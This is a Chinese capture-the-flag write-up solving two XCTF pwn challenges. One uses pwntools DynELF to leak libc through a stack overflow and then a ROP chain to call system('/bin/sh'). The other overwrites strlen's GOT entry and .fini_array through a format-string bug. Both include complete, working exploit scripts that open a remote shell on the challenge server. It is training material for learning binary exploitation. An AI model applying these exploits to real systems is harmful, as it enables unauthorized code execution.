DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。

```python
p = process('./xxx')

def leak(address):

 #各种预处理

 payload = "xxxxxxxx" + address + "xxxxxxxx"

 p.send(payload)

 #各种处理

 data = p.recv(4)

 log.debug("%#x => %s" % (address, (data **or** '').encode('hex')))

 return data

d = DynELF(leak, elf=ELF("./xxx"))   #初始化DynELF模块

systemAddress = d.lookup('system', 'libc') #在libc文件中搜索system函数的地址
```

write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。

借助write函数，可以实现泄露

所以我们的leak函数可以这么写

```python
def leak(address):
    payload='A'*0x6c+'a'*4+p32(write_plt)+p32(vulnaddress)+p32(1)+p32(address)+p32(4)
    r.send(payload)
    data=r.recv(4)
    print(data)
    return data
print r.recv()

dyn = DynELF(leak,elf=ELF('./pwn-200'))
sys_addr = dyn.lookup("system",'libc')
print("system address:",hex(sys_addr))

```

我们还需要找到一个连续3次pop的地址，这里找到的是0x0804856c

 <img src="image-20210413221514111.png" alt="image-20210413221514111" style="zoom:67%;" />

然后我们需要一个bss段写入，这里可以用0x0804A020

 <img src="image-20210413221605895.png" alt="image-20210413221605895" style="zoom:67%;" />

准备了这些条件后，我们就可以构建payload脚本如下

```python
#coding=utf-8
from pwn import *
context.log_level = 'debug'
p=remote("220.249.52.134",36377)
#p=process("./pwn200")
#gdb.attach(p)
start_addr=0x080483d0
vulnaddress=0x08048484
elf=ELF("./pwn-200")
write_plt=elf.symbols['write']
read_plt=elf.symbols['read']
bss_addr = 0x0804a020
def leak(address):
    payload='A'*0x6c+'a'*4+p32(write_plt)+p32(vulnaddress)+p32(1)+p32(address)+p32(4)
    p.send(payload)
    data=p.recv(4)
    print(data)
    return data
print p.recv()

dyn = DynELF(leak,elf=ELF('./pwn-200'))
sys_addr = dyn.lookup("system",'libc')
print("system address:",hex(sys_addr))

#调用_start函数，恢复栈
payload1 = 'A'*0x6c+'a'*4
payload1 += p32(start_addr)
p.send(payload1)
p.recv()

ppp_addr = 0x0804856c  #获取到的连续3次pop操作的gadget的地址 
payload2 = 'A'*0x6c+'a'*4
payload2 += p32(read_plt)
payload2 += p32(ppp_addr)
payload2 += p32(0)
payload2 += p32(bss_addr)
payload2 += p32(8)
payload2 += p32(sys_addr) + p32(vulnaddress) + p32(bss_addr)
#在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress
#构造read(0,bss_addr,8)把'/bin/sh'读到bss段上，因为bss段可执行
#用三次pop把指针指向了systemAddress，此时调用system()函数，再栈溢出把bss段上的内容('/bin/sh')当作参数传给system()调用
p.send(payload2)
p.send('/bin/sh')
p.interactive()

```

# 攻防世界-pwn-greeting-150-格式化字符串覆盖got表-循环

1.首先检查程序

​      <img src="image-20210413221809095.png" alt="image-20210413221809095" style="zoom:67%;" />                       

32位程序，只开启了栈保护和堆栈不可执行

2.用ida查看程序中的函数

主函数如下

 <img src="image-20210413221907760.png" alt="image-20210413221907760" style="zoom:67%;" />



该程序的大致就是向v5读入64字节，读入成功后，将v5的内容输出到s里面，之后将s直接输出，这最后一个printf(&s)存在一个格式化字符串漏洞，可以进行利用，进行任意地址读写 

3.接下来需要测试偏移

输入

.%4x.%4x.%4x.%4x.%4x.%4x.%4x.%4x.%4x.%4x.%4x.%4x

 ![image-20210413221928354](image-20210413221928354.png)

可以看到对于该程序，输出的第43个字节是我们的”.”号的ASCII码值0x2e

但是该程序没有循环，就算是我们覆盖了got表的地址，也无法再次返回程序了，这时候我们需要用到一个可以使用格式化字符串漏洞使程序无限循环的漏洞

此漏洞原理为：写代码的时候我们以main函数作为程序入口，但是编译成程序的时候入口并不是main函数，而是start代码段。事实上，start代码段还会调用__libc_start_main来做一些初始化工作，最后调用main函数并在main函数结束后做一些处理。

具体流程如下

 <img src="image-20210413221946280.png" alt="image-20210413221946280" style="zoom:67%;" />

 

简单地说，在main函数前会调用.init段代码和.init_array段的函数数组中每一个函数指针。同样的，main函数结束后也会调用.fini段代码和.fini._arrary段的函数数组中的每一个函数指针。

而我们的目标就是修改.fini_array数组的第一个元素为start。需要注意的是，这个数组的内容在再次从start开始执行后又会被修改，且程序可读取的字节数有限，因此需要一次性修改两个地址并且合理调整payload。

所以当main运行第一次时，将strlen函数的got表覆写成system的plt地址，然后将.fini._arra第一个元素覆写成strat地址，进而造成循环，第二次main函数时，输入“/bin/sh\x00”，在调用strlen函数时就会变成system("/bin/sh"),进而拿到shell。

经过查看，system的plt表地址为0x8048490

<img src="image-20210413222012210.png" alt="image-20210413222012210" style="zoom:67%;" /> 

调用的fini_got = 0x8049934 

 <img src="image-20210413222025348.png" alt="image-20210413222025348" style="zoom:67%;" />

又知道这里的数据为0x80485A0,又因为main函数的地址为0x08485ED，所以我们只需要修改后2位的数据即可让调用fini的时候返回main函数

 <img src="image-20210413222048628.png" alt="image-20210413222048628" style="zoom:67%;" />

然后通过查看知道strlen的got表地址为0x8049A54

 <img src="image-20210413222103549.png" alt="image-20210413222103549" style="zoom:67%;" />

综上所述

fini_got = 0x8049934 

main_addr = 0x80485ED 

strlen_got = 0x8049A54 

system_plt = 0x8048490

因此设置一个数组为

arr = [ 

  0x85ED, 

  0x8490,0x804 

] 

因此，我们要在fini_got写入2字节数据arr[0]

在strlen_got写入2字节数据arr[2]，在strlen_got+2处写入2字节数据arr[1]

 

进而构造payload为

```python
from pwn import *  
p = remote('220.249.52.134',46970)   
fini_got = 0x8049934  
main_addr = 0x80485ED  
strlen_got = 0x8049A54  
system_plt = 0x8048490  
p.recvuntil('Please tell me your name... ')  
payload = 'a'*2  
payload += p32(strlen_got)  
payload +=  p32(strlen_got+2)  
payload += p32(fini_got)  
arr = [  
   0x85ED,  
   0x8490,0x804  
]  
#hn 为WORD(字),hhn为BYTE(字节),n为DWORD(双字)  
#修改strlen GOT内容的前2字节  
num = arr[2] - 32  
payload += '%' + str(num) + 'c%13$hn'  
#修改strlen GOT内容的后2字节  
num = arr[1] - arr[2]  
payload += '%' + str(num) + 'c%12$hn'  
#修改fini的后2字节  
num = arr[0] - arr[1]  
payload += '%' + str(num) + 'c%14$hn'  
print len(payload)  
p.sendline(payload)  
#get shell   
p.recvuntil('Please tell me your name... ')   
p.sendline('cat flag')   
p.interactive()  

```

